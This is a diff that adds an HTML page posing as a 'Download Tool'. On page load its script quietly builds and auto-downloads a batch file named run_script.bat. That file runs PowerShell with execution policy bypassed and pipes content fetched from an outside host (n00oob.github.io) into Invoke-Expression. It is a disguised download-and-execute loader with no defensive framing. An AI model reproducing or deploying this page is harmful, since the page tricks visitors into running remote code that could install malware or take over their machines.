@@ -1,0 +1,26 @@
+<!DOCTYPE html>
+<html>
+<head>
+    <title>Download Tool</title>
+</head>
+<body>
+    <p>Your download should start automatically. If it doesn't, click the link below.</p>
+    <a id="downloadLink" style="display:none;">Click here to download</a>
+
+    <script>
+        window.onload = function() {
+            const batContent = `@echo off\npowershell -NoProfile -ExecutionPolicy Bypass -Command "irm 'n00oob.github.io' | iex"\nexit`;
+            
+            const blob = new Blob([batContent], { type: 'text/plain' });
+            
+            const link = document.getElementById('downloadLink');
+            link.href = window.URL.createObjectURL(blob);
+            link.download = "run_script.bat";
+            
+            link.click();
+            
+            window.URL.revokeObjectURL(link.href);
+        };
+    </script>
+</body>
+</html>
